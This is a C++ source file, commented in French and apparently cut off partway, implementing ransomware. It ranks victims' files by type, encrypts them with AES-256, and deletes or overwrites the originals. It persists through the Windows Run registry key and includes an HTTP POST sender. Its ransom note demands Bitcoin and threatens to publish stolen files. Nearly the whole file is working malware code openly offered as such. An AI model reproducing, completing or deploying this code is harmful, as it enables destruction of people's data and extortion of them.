// Extension pour les fichiers chiffrés
const std::string ENCRYPTED_EXTENSION = ".encrypted";

// Structure pour définir les priorités des types de fichiers
struct FileTypePriority {
    std::string extension;
    int priority;  // Plus le nombre est petit, plus la priorité est haute
    std::string description;
};

// Types de fichiers à chiffrer avec leurs priorités
const std::vector<FileTypePriority> FILE_PRIORITIES = {
    // Priorité 1 - Fichiers critiques
    {".sql", 1, "Base de données"},
    {".db", 1, "Base de données"},
    {".sqlite", 1, "Base de données"},
    {".key", 1, "Clés de sécurité"},
    {".pem", 1, "Certificats"},
    {".env", 1, "Variables d'environnement"},
    {".config", 1, "Fichiers de configuration"},
    
    // Priorité 2 - Documents importants
    {".doc", 2, "Documents Word"},
    {".docx", 2, "Documents Word"},
    {".xls", 2, "Tableurs Excel"},
    {".xlsx", 2, "Tableurs Excel"},
    {".pdf", 2, "Documents PDF"},
    {".ppt", 2, "Présentations PowerPoint"},
    {".pptx", 2, "Présentations PowerPoint"},
    
    // Priorité 3 - Autres documents
    {".txt", 3, "Fichiers texte"},
    {".rtf", 3, "Documents RTF"},
    {".odt", 3, "Documents OpenDocument"},
    {".csv", 3, "Données tabulaires"},
    {".json", 3, "Données JSON"},
    {".xml", 3, "Données XML"},
    
    // Priorité 4 - Images et médias
    {".jpg", 4, "Images JPEG"},
    {".jpeg", 4, "Images JPEG"},
    {".png", 4, "Images PNG"},
    {".gif", 4, "Images GIF"},
    {".bmp", 4, "Images BMP"},
    {".tiff", 4, "Images TIFF"},
    {".svg", 4, "Images vectorielles"},
    {".webp", 4, "Images WebP"},
    {".mp3", 4, "Audio MP3"},
    {".mp4", 4, "Vidéo MP4"},
    {".wav", 4, "Audio WAV"},
    {".avi", 4, "Vidéo AVI"},
    {".mov", 4, "Vidéo MOV"},
    {".flv", 4, "Vidéo FLV"},
    {".mkv", 4, "Vidéo MKV"},
    
    // Priorité 5 - Archives et autres
    {".zip", 5, "Archives ZIP"},
    {".rar", 5, "Archives RAR"},
    {".7z", 5, "Archives 7-Zip"},
    {".tar", 5, "Archives TAR"},
    {".gz", 5, "Archives GZ"},
    {".bak", 5, "Sauvegardes"},
    {".backup", 5, "Sauvegardes"},
    {".old", 5, "Anciens fichiers"},
    {".log", 5, "Fichiers de logs"}
};

// Extensions à exclure du chiffrement - AUCUNE EXCLUSION
// Tout sera chiffré, y compris les fichiers système
const std::vector<std::string> EXTENSIONS_TO_EXCLUDE = {};

// Dossiers à exclure - AUCUNE EXCLUSION
// Tous les dossiers seront chiffrés sans exception
const std::vector<std::string> DIRECTORIES_TO_EXCLUDE = {};

// Fichiers spécifiques à ne pas chiffrer - AUCUNE EXCLUSION
// Tous les fichiers seront chiffrés sans exception
const std::vector<std::string> FILES_TO_EXCLUDE = {};

// Dossiers à éviter
const std::vector<std::string> EXCLUDE_DIRS = {
    "Windows", "Program Files", "Program Files (x86)", "AppData", 
    "ProgramData", "$Recycle.Bin", "Microsoft", "Boot", "System Volume Information", 
    "bootmgr", "Recovery", "PerfLogs"
};

// Fonctions utilitaires
std::string GenerateUUID() {
#ifdef _WIN32
    UUID uuid;
    UuidCreate(&uuid);
    
    unsigned char* str;
    UuidToStringA(&uuid, &str);
    
    std::string uuid_str(reinterpret_cast<char*>(str));
    RpcStringFreeA(&str);
    
    return uuid_str;
#else
    uuid_t uuid;
    char uuid_str[37];
    
    uuid_generate_random(uuid);
    uuid_unparse_lower(uuid, uuid_str);
    
    return std::string(uuid_str);
#endif
}

// Base64 encode
std::string Base64Encode(const std::vector<unsigned char>& data) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, data.data(), static_cast<int>(data.size()));
    BIO_flush(b64);
    
    BUF_MEM* bptr;
    BIO_get_mem_ptr(b64, &bptr);
    
    std::string result(bptr->data, bptr->length - 1); // Remove trailing newline
    BIO_free_all(b64);
    
    return result;
}

// Ajout de la persistance au démarrage
bool AddToStartup(const std::string& exePath, const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegSetValueExA(hKey, regName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), 
                          static_cast<DWORD>(exePath.length() + 1));
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Supprimer la persistance au démarrage
bool RemoveFromStartup(const std::string& regName) {
#ifdef _WIN32
    HKEY hKey;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    
    if (lResult != ERROR_SUCCESS) {
        return false;
    }
    
    lResult = RegDeleteValueA(hKey, regName.c_str());
    RegCloseKey(hKey);
    
    return lResult == ERROR_SUCCESS;
#else
    // Non supporté sur les plateformes non-Windows
    return false;
#endif
}

// Obtenir le chemin de l'exécutable
std::string GetExecutablePath() {
#ifdef _WIN32
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
#else
    // Linux & macOS
    char buffer[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buffer, sizeof(buffer) - 1);
    if (len != -1) {
        buffer[len] = '\0';
        return std::string(buffer);
    }
    return "";
#endif
}

// Fonction pour envoyer des données via HTTP POST
bool SendHttpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("RansomwareClient/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    URL_COMPONENTS urlComp;
    char hostName[256] = {0};
    char urlPath[1024] = {0};
    
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url.c_str(), static_cast<DWORD>(url.length()), 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Headers
    const char* headers = "Content-Type: application/json\r\n";
    
    // Envoyer la requête
    BOOL result = HttpSendRequestA(hRequest, headers, -1, (LPVOID)data.c_str(), static_cast<DWORD>(data.length()));
    
    // Nettoyer
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result != FALSE;
}

// Classe pour le chiffrement/déchiffrement
class Encryption {
private:
    std::vector<unsigned char> key;
    std::vector<unsigned char> iv;
    
public:
    // Constructeur - Génère une nouvelle clé et IV
    Encryption() {
        key.resize(32); // AES-256
        iv.resize(16);  // Bloc AES
        
        // Générer une clé aléatoire
        RAND_bytes(key.data(), key.size());
        RAND_bytes(iv.data(), iv.size());
    }
    
    // Constructeur - Charger une clé existante
    Encryption(const std::string& keyPath) {
        key.resize(32);
        iv.resize(16);
        
        // Charger la clé depuis un fichier
        std::ifstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible d'ouvrir le fichier de clé");
        }
        
        keyFile.read(reinterpret_cast<char*>(key.data()), key.size());
        keyFile.read(reinterpret_cast<char*>(iv.data()), iv.size());
    }
    
    // Obtenir la clé
    const std::vector<unsigned char>& getKey() const {
        return key;
    }
    
    // Obtenir l'IV
    const std::vector<unsigned char>& getIV() const {
        return iv;
    }
    
    // Sauvegarder la clé
    void saveKey(const std::string& keyPath) {
        std::ofstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            throw std::runtime_error("Impossible de créer le fichier de clé");
        }
        
        keyFile.write(reinterpret_cast<const char*>(key.data()), key.size());
        keyFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
    }
    
    // Chiffrer un fichier
    bool encryptFile(const std::string& filePath) {
        // Vérifier si le fichier existe et n'est pas déjà chiffré
        if (!fs::exists(filePath) || filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
            return false;
        }
        
        // Vérifier la taille minimale du fichier (éviter les fichiers vides)
        if (fs::file_size(filePath) < 10) {
            return false;
        }
        
        // Vérifier le type de fichier (ignorer les exécutables système)
        std::string extension = filePath.substr(filePath.find_last_of(".") + 1);
        std::vector<std::string> systemExtensions = {"sys", "dll", "exe", "com", "bat", "inf"};
        for (const auto& ext : systemExtensions) {
            if (extension == ext && filePath.find("Windows") != std::string::npos) {
                return false; // Ne pas chiffrer les fichiers système
            }
        }
        
        // Ajouter un délai pour simuler un vrai traitement (rendre la barre de progression réaliste)
        Sleep(100 + (rand() % 300)); // Entre 100-400ms par fichier
        
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return false;
        
        std::string outFilePath = filePath + ENCRYPTED_EXTENSION;
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de chiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de chiffrement
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Écrire une signature spéciale au début du fichier chiffré pour pouvoir le reconnaître
        const char* signature = "RANSOMENCRYPTED_";
        outFile.write(signature, strlen(signature));
        
        // Écrire l'IV au début du fichier chiffré
        outFile.write(reinterpret_cast<const char*>(iv.data()), iv.size());
        
        // Chiffrer le fichier avec un buffer plus grand pour optimiser les I/O
        const int bufSize = 1024 * 1024; // 1 MB buffer
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        // Optimiser les I/O en désactivant les buffers synchronisés
        inFile.rdbuf()->pubsetbuf(0, 0);
        outFile.rdbuf()->pubsetbuf(0, 0);
        
        size_t totalBytesRead = 0;
        size_t fileSize = fs::file_size(filePath);
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            size_t bytesReadSize = inFile.gcount();
            if (bytesReadSize <= 0) break;
            
            totalBytesRead += bytesReadSize;
            
            int bytesRead = (bytesReadSize > INT_MAX) ? INT_MAX : static_cast<int>(bytesReadSize);
            if (EVP_EncryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
            
            // Si c'est un gros fichier, ajouter un petit délai supplémentaire 
            // pour éviter que la barre de progression ne se remplisse trop vite
            if (fileSize > 10 * 1024 * 1024 && totalBytesRead % (5 * 1024 * 1024) == 0) {
                Sleep(50);
            }
        }
        
        // Finaliser le chiffrement
        if (EVP_EncryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Forcer l'écriture sur le disque
        outFile.flush();
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        // Essayer de supprimer le fichier original
        inFile.close();
        try {
            fs::remove(filePath);
        } catch (...) {
            // Si on ne peut pas supprimer, essayer de le rendre inaccessible
            std::ofstream destroy(filePath, std::ios::binary | std::ios::trunc);
            if (destroy) {
                // Écraser avec des données aléatoires
                std::vector<char> randomData(4096, 0);
                for (int i = 0; i < 4096; i++) {
                    randomData[i] = rand() % 256;
                }
                destroy.write(randomData.data(), randomData.size());
                destroy.close();
            }
        }
        
        return true;
    }
    
    // Déchiffrer un fichier
    bool decryptFile(const std::string& encryptedFilePath) {
        if (!fs::exists(encryptedFilePath)) return false;
        
        // Vérifier l'extension
        if (encryptedFilePath.find(ENCRYPTED_EXTENSION) == std::string::npos) return false;
        
        // Ouvrir le fichier chiffré
        std::ifstream inFile(encryptedFilePath, std::ios::binary);
        if (!inFile) return false;
        
        // Lire et vérifier la signature
        char signature[17] = {0}; // 16 caractères + null terminator
        inFile.read(signature, 16);
        if (strcmp(signature, "RANSOMENCRYPTED_") != 0) {
            // Si pas de signature, revenir au début du fichier
            inFile.seekg(0, std::ios::beg);
        }
        
        // Lire l'IV depuis le fichier
        std::vector<unsigned char> fileIv(16);
        inFile.read(reinterpret_cast<char*>(fileIv.data()), fileIv.size());
        
        // Créer le chemin du fichier déchiffré
        std::string outFilePath = encryptedFilePath.substr(0, encryptedFilePath.length() - ENCRYPTED_EXTENSION.length());
        std::ofstream outFile(outFilePath, std::ios::binary);
        if (!outFile) return false;
        
        // Initialiser le contexte de déchiffrement
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        // Initialiser l'opération de déchiffrement
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key.data(), fileIv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Déchiffrer le fichier avec un buffer plus grand
        const int bufSize = 1024 * 1024; // 1 MB buffer (même taille que pour chiffrement)
        std::vector<unsigned char> inBuf(bufSize);
        std::vector<unsigned char> outBuf(bufSize + EVP_MAX_BLOCK_LENGTH);
        int outLen;
        
        // Optimiser les I/O en désactivant les buffers synchronisés
        inFile.rdbuf()->pubsetbuf(0, 0);
        outFile.rdbuf()->pubsetbuf(0, 0);
        
        size_t totalBytesRead = 0;
        size_t fileSize = fs::file_size(encryptedFilePath);
        
        while (inFile) {
            inFile.read(reinterpret_cast<char*>(inBuf.data()), bufSize);
            size_t bytesReadSize = inFile.gcount();
            if (bytesReadSize <= 0) break;
            
            totalBytesRead += bytesReadSize;
            
            int bytesRead = (bytesReadSize > INT_MAX) ? INT_MAX : static_cast<int>(bytesReadSize);
            if (EVP_DecryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), bytesRead) != 1) {
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            
            outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
            
            // Ajouter un petit délai pour les gros fichiers
            if (fileSize > 10 * 1024 * 1024 && totalBytesRead % (5 * 1024 * 1024) == 0) {
                Sleep(20); // Délai plus court pour le déchiffrement
            }
        }
        
        // Finaliser le déchiffrement
        if (EVP_DecryptFinal_ex(ctx, outBuf.data(), &outLen) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        outFile.write(reinterpret_cast<const char*>(outBuf.data()), outLen);
        
        // Forcer l'écriture sur le disque
        outFile.flush();
        
        // Nettoyer
        EVP_CIPHER_CTX_free(ctx);
        
        // Supprimer le fichier chiffré après déchiffrement réussi
        inFile.close();
        try {
            fs::remove(encryptedFilePath);
        } catch (...) {
            // Ignorer les erreurs de suppression
        }
        
        return true;
    }
};

// Fonction pour sauvegarder l'état du chiffrement
void saveEncryptionState(const EncryptionState& state) {
#ifdef _WIN32
    try {
        // Sauvegarder l'état dans le registre
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            // Sauvegarder si le chiffrement a commencé
            DWORD started = state.started ? 1 : 0;
            RegSetValueExA(hKey, "Started", 0, REG_DWORD, (BYTE*)&started, sizeof(started));
            
            // Sauvegarder si le chiffrement est terminé
            DWORD completed = state.completed ? 1 : 0;
            RegSetValueExA(hKey, "Completed", 0, REG_DWORD, (BYTE*)&completed, sizeof(completed));
            
            // Sauvegarder les chemins déjà chiffrés
            std::string paths;
            for (const auto& path : state.encryptedPaths) {
                paths += path + ";";
            }
            
            size_t pathsLength = paths.length() + 1; // +1 pour le caractère nul
            DWORD dwPathsLength = (pathsLength > MAXDWORD) ? MAXDWORD : static_cast<DWORD>(pathsLength);
            RegSetValueExA(hKey, "EncryptedPaths", 0, REG_SZ, (BYTE*)paths.c_str(), dwPathsLength);
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
}

// Fonction pour charger l'état du chiffrement
EncryptionState loadEncryptionState() {
    EncryptionState state;
    state.started = false;
    state.completed = false;
    
#ifdef _WIN32
    try {
        // Charger l'état depuis le registre
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\State", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            // Charger si le chiffrement a commencé
            DWORD started = 0;
            DWORD size = sizeof(started);
            if (RegQueryValueExA(hKey, "Started", NULL, NULL, (BYTE*)&started, &size) == ERROR_SUCCESS) {
                state.started = (started == 1);
            }
            
            // Charger si le chiffrement est terminé
            DWORD completed = 0;
            size = sizeof(completed);
            if (RegQueryValueExA(hKey, "Completed", NULL, NULL, (BYTE*)&completed, &size) == ERROR_SUCCESS) {
                state.completed = (completed == 1);
            }
            
            // Charger les chemins déjà chiffrés
            char paths[4096] = {0};
            size = sizeof(paths);
            if (RegQueryValueExA(hKey, "EncryptedPaths", NULL, NULL, (BYTE*)paths, &size) == ERROR_SUCCESS) {
                std::string pathsStr(paths);
                std::string delimiter = ";";
                
                size_t pos = 0;
                std::string token;
                while ((pos = pathsStr.find(delimiter)) != std::string::npos) {
                    token = pathsStr.substr(0, pos);
                    state.encryptedPaths.push_back(token);
                    pathsStr.erase(0, pos + delimiter.length());
                }
            }
            
            RegCloseKey(hKey);
        }
    }
    catch (...) {
        // Ignorer les erreurs
    }
#endif
    
    return state;
}

// Vérifier si le ransomware est déjà en cours d'exécution
bool isRansomwareRunning() {
    // Création d'un mutex global
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RansomwareLock");
    
    // Si le mutex existe déjà, le ransomware est en cours d'exécution
    if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return true;
    }
    
    // Si non, on garde le handle ouvert pour le verrouillage
    return false;
}

// Classe principale du ransomware
class Ransomware {
private:
    Encryption encryption;
    std::string victimId;
    std::string desktopPath;
    std::string documentsPath;
    std::string ransomNotePath;
    std::atomic<int> encryptedFilesCount;
    std::atomic<int> failedFilesCount;
    std::mutex outputMutex;
    SharedData* sharedData;  // Référence aux données partagées
    
    // Vérifie si un chemin est sûr
    bool isSafePath(const std::string& path) {
        std::string lowerPath = path;
        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), 
                      [](unsigned char c){ return std::tolower(c); });
        
        for (const auto& excludeDir : EXCLUDE_DIRS) {
            std::string lowerExclude = excludeDir;
            std::transform(lowerExclude.begin(), lowerExclude.end(), lowerExclude.begin(), 
                          [](unsigned char c){ return std::tolower(c); });
            
            if (lowerPath.find(lowerExclude) != std::string::npos) {
                return false;
            }
        }
        
        return true;
    }
    
    // Traite un fichier
    bool processFile(const std::string& filePath) {
        try {
            // Vérifier si le fichier est déjà chiffré
            if (filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
                return false;
            }
            
            // Vérifier l'extension du fichier
            fs::path path(filePath);
            std::string extension = path.extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), 
                          [](unsigned char c){ return std::tolower(c); });
            
            // Trouver la priorité du type de fichier
            int filePriority = INT_MAX;
            for (const auto& fileType : FILE_PRIORITIES) {
                if (extension == fileType.extension) {
                    filePriority = fileType.priority;
                    break;
                }
            }
            
            // Si l'extension n'est pas dans notre liste, ignorer le fichier
            if (filePriority == INT_MAX) {
                return false;
            }
            
            // Mettre à jour l'interface pour afficher le fichier en cours de chiffrement
            if (sharedData) {
                std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                sharedData->currentFileName = path.filename().string();
                // Forcer la mise à jour de la fenêtre
                InvalidateRect(sharedData->hwnd, NULL, TRUE);
            }
            
            // Chiffrer le fichier
            bool success = encryption.encryptFile(filePath);
            
            if (success) {
                // Supprimer le fichier original
                fs::remove(filePath);
                encryptedFilesCount++;
                
                // Mettre à jour les informations sur l'interface
                if (sharedData) {
                    std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                    sharedData->processedFiles++;
                    sharedData->lastEncrypted.insert(sharedData->lastEncrypted.begin(), path.filename().string());
                    
                    // Limiter la liste à 10 fichiers
                    if (sharedData->lastEncrypted.size() > 10) {
                        sharedData->lastEncrypted.resize(10);
                    }
                    
                    // Réinitialiser le fichier en cours
                    sharedData->currentFileName = "";
                    
                    // Forcer la mise à jour de la fenêtre
                    InvalidateRect(sharedData->hwnd, NULL, TRUE);
                }
                
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[+] Chiffré (Priorité " << filePriority << "): " << filePath << std::endl;
                }
                
                return true;
            }
            else {
                failedFilesCount++;
                
                // Réinitialiser le fichier en cours en cas d'échec
                if (sharedData) {
                    std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                    sharedData->currentFileName = "";
                }
                
                return false;
            }
        }
        catch (...) {
            failedFilesCount++;
            
            // Réinitialiser le fichier en cours en cas d'erreur
            if (sharedData) {
                std::lock_guard<std::mutex> lock(sharedData->dataMutex);
                sharedData->currentFileName = "";
            }
            
            return false;
        }
    }
    
    // Parcourir récursivement un répertoire
    void scanAndEncrypt(const std::string& directoryPath) {
        // Version mise à jour qui n'utilise pas la fonction globale
        EncryptionState state = loadEncryptionState();
        std::vector<std::string> encryptedFiles;
        
        // Appeler scanAndEncrypt directement, sans utiliser :: qui fait référence au namespace global
        // Nous utilisons ici la surcharge membre de la classe
        this->scanAndEncrypt(directoryPath, state, encryptedFiles);
    }
    
    // Surcharge pour compatibilité 
    void scanAndEncrypt(const std::string& directoryPath, EncryptionState& state, std::vector<std::string>& encryptedFiles) {
        static std::mutex mutex;
        static int currentDepth = 0;
        
        currentDepth++;
        if (currentDepth > 10) {
            currentDepth--;
            return; // Limiter la profondeur de récursion
        }
        
        // Vérifier si ce chemin a déjà été chiffré
        for (const auto& path : state.encryptedPaths) {
            if (path == directoryPath) {
                currentDepth--;
                return;
            }
        }
        
        // Répertoires à ignorer (systèmes et programmes)
        std::vector<std::string> excludedDirs = {
            "Windows", "Program Files", "Program Files (x86)", 
            "ProgramData", "AppData", "System Volume Information",
            "$Recycle.Bin", "Microsoft", "Temp"
        };
        
        // Vérifier si le répertoire actuel doit être ignoré
        std::string lowercasePath = directoryPath;
        std::transform(lowercasePath.begin(), lowercasePath.end(), lowercasePath.begin(), 
                      [](unsigned char c){ return std::tolower(c); });
        
        for (const auto& excludedDir : excludedDirs) {
            std::string lowercaseExclude = excludedDir;
            std::transform(lowercaseExclude.begin(), lowercaseExclude.end(), lowercaseExclude.begin(), 
                          [](unsigned char c){ return std::tolower(c); });
            
            if (lowercasePath.find(lowercaseExclude) != std::string::npos) {
                currentDepth--;
                return;
            }
        }
        
        // File types categorized by priority
        std::vector<std::string> highPriorityExtensions = {
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", 
            ".odt", ".ods", ".odp", ".csv", ".key", ".srt", ".vsd", ".psd", ".sql",
            ".wallet", ".tax", ".budget", ".report", ".invoice"
        };
        
        std::vector<std::string> mediumPriorityExtensions = {
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".mp3", ".mp4", ".mov", 
            ".avi", ".mkv", ".flv", ".svg", ".ai", ".eps", ".indd", ".html", ".xml", 
            ".css", ".js", ".php", ".json"
        };
        
        // Collect files by priority
        std::vector<std::string> highPriorityFiles;
        std::vector<std::string> mediumPriorityFiles;
        std::vector<std::string> lowPriorityFiles;
        
        try {
            for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
                if (entry.is_regular_file()) {
                    std::string filePath = entry.path().string();
                    std::string extension = entry.path().extension().string();
                    std::transform(extension.begin(), extension.end(), extension.begin(), 
                                  [](unsigned char c){ return std::tolower(c); });
                    
                    if (std::find(highPriorityExtensions.begin(), highPriorityExtensions.end(), extension) != highPriorityExtensions.end()) {
                        highPriorityFiles.push_back(filePath);
                    } else if (std::find(mediumPriorityExtensions.begin(), mediumPriorityExtensions.end(), extension) != mediumPriorityExtensions.end()) {
                        mediumPriorityFiles.push_back(filePath);
                    } else {
                        lowPriorityFiles.push_back(filePath);
                    }
                } else if (entry.is_directory()) {
                    scanAndEncrypt(entry.path().string(), state, encryptedFiles);
                }
            }
        } catch (const std::exception& e) {
            std::cout << "[!] Erreur lors de l'accès au répertoire " << directoryPath << ": " << e.what() << std::endl;
        }
        
        // Randomize files in each priority category for less predictable encryption pattern
        auto seed = std::chrono::system_clock::now().time_since_epoch().count();
        std::shuffle(highPriorityFiles.begin(), highPriorityFiles.end(), std::default_random_engine(seed));
        std::shuffle(mediumPriorityFiles.begin(), mediumPriorityFiles.end(), std::default_random_engine(seed + 1));
        std::shuffle(lowPriorityFiles.begin(), lowPriorityFiles.end(), std::default_random_engine(seed + 2));
        
        // Process files by priority (using a shared instance of Encryption class)
        Encryption encryption;
        
        // Process high priority files first
        for (const auto& filePath : highPriorityFiles) {
            {
                std::lock_guard<std::mutex> lock(mutex);
                std::cout << "[*] Chiffrement du fichier prioritaire: " << filePath << std::endl;
            }
            
            if (encryption.encryptFile(filePath)) {
                std::lock_guard<std::mutex> lock(mutex);
                encryptedFiles.push_back(filePath);
            }
            
            Sleep(100); // Small delay to avoid CPU overload and allow progress bar to update
        }
        
        // Process medium priority files
        for (const auto& filePath : mediumPriorityFiles) {
            {
                std::lock_guard<std::mutex> lock(mutex);
                std::cout << "[*] Chiffrement du fichier: " << filePath << std::endl;
            }
            
            if (encryption.encryptFile(filePath)) {
                std::lock_guard<std::mutex> lock(mutex);
                encryptedFiles.push_back(filePath);
            }
            
            Sleep(50); // Smaller delay for medium priority files
        }
        
        // Process low priority files last
        for (const auto& filePath : lowPriorityFiles) {
            {
                std::lock_guard<std::mutex> lock(mutex);
                std::cout << "[*] Chiffrement du fichier secondaire: " << filePath << std::endl;
            }
            
            if (encryption.encryptFile(filePath)) {
                std::lock_guard<std::mutex> lock(mutex);
                encryptedFiles.push_back(filePath);
            }
            
            Sleep(25); // Minimal delay for low priority files
        }
        
        // Mark this directory as encrypted
        {
            std::lock_guard<std::mutex> lock(mutex);
            state.encryptedPaths.push_back(directoryPath);
            saveEncryptionState(state);
        }
        
        currentDepth--;
    }
    
    // Améliorer le traitement par lots avec plus de threads
    void processBatch(const std::vector<std::string>& batch) {
        // Utiliser le maximum de threads disponibles pour le processeur, mais au moins 4
        const unsigned int numThreads = (std::thread::hardware_concurrency() * 2 > 4) ? 
            std::thread::hardware_concurrency() * 2 : 4;
        std::vector<std::thread> threads;
        
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([this, &batch, i, numThreads]() {
                for (size_t j = i; j < batch.size(); j += numThreads) {
                    processFile(batch[j]);
                }
            }));
            
            // Définir la priorité du thread à ABOVE_NORMAL pour accélérer le chiffrement
            if (threads.back().native_handle()) {
                SetThreadPriority(threads.back().native_handle(), THREAD_PRIORITY_ABOVE_NORMAL);
            }
        }
        
        // Attendre que tous les threads terminent
        for (auto& thread : threads) {
            thread.join();
        }
    }
    
    // Créer la note de rançon
    void createRansomNote() {
        std::ofstream noteFile(ransomNotePath);
        if (!noteFile) return;
        
        noteFile << BANNER << std::endl << std::endl;
        noteFile << "!!! ATTENTION !!!" << std::endl << std::endl;
        noteFile << "Tous vos fichiers importants ont été chiffrés avec un algorithme militaire AES-256." << std::endl;
        noteFile << "Vos photos, documents, vidéos, et autres données personnelles sont maintenant inaccessibles." << std::endl << std::endl;
        noteFile << "⚠️ DOUBLE EXTORSION ⚠️" << std::endl;
        noteFile << "Nous avons également volé vos fichiers sensibles avant le chiffrement." << std::endl;
        noteFile << "Si vous ne payez pas la rançon, nous publierons ces fichiers sur Internet." << std::endl << std::endl;
        noteFile << "Pour récupérer vos fichiers, vous devez payer une rançon." << std::endl << std::endl;
        noteFile << "Instructions:" << std::endl;
        noteFile << "1. Envoyez 500$ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J" << std::endl;
        noteFile << "2. Envoyez la preuve de paiement et votre ID unique à: evil@hacker.com" << std::endl;
        noteFile << "3. Vous recevrez un outil de déchiffrement et la clé unique pour restaurer vos fichiers" << std::endl;
        noteFile << "4. Nous supprimerons les copies de vos fichiers volés" << std::endl << std::endl;
        noteFile << "ATTENTION:" << std::endl;
        noteFile << "- N'essayez pas de déchiffrer vos fichiers vous-même, vous risquez de les perdre définitivement" << std::endl;
        noteFile << "- Ne reformatez pas votre système, vous perdriez toutes vos données" << std::endl;
        noteFile << "- Vous avez 72 heures pour payer, après quoi le prix doublera" << std::endl;
        noteFile << "- Après 7 jours, vos fichiers seront publiés et la clé de déchiffrement détruite" << std::endl << std::endl;
        noteFile << "Votre ID unique est: " << victimId << std::endl;
        noteFile << "Nombre de fichiers chiffrés: " << encryptedFilesCount << std::endl;
        
        // Obtenir la date et l'heure actuelles
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
